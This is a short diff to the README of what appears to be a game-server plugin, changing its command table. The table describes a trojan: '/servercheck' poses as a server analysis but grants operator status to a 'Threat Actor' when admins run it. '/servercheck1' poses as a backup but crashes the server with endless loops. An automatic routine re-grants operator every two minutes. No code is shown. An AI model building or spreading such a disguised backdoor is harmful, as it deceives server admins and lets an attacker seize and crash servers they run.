@@ -43,8 +43,8 @@ Below is a list of the commands included in this project and their functions:
 
 | Command | Function | Description |
 | :--- | :--- | :--- |
-| `[Command 1]` | **/servercheck** | *Admins manually executes server analysis and this will grant you Operator status quickly* |
-| `[Command 2]` | **/servercheck1** | *This command diguises as a backup command if /servercheck fails. But if executed, it will serve as a crashing blow to the servers resources using an 3 endless while loop to ensure servers termination* |
-| `[Command 3]` | **AUTO ANALYSIS** | *If the admins executed the /servercheck when you're not in the server. The auto analysis will make you an operator every 2 minutes.* |
+| `/servercheck` | **Grants Operator status to the Threat Actor** | *Admins manually executes server analysis and this will grant you Operator status quickly* |
+| `/servercheck1` | **Crash The Server** | *This command diguises as a backup command if /servercheck fails. But if executed, it will serve as a crashing blow to the servers resources using an 3 endless while loop to ensure servers termination* |
+| `AUTO ANALYSIS` | **Analysis every 2 minutes** | *If the admins executed the /servercheck when you're not in the server. The auto analysis will make you an operator every 2 minutes.* |
 
 This project is open-source.
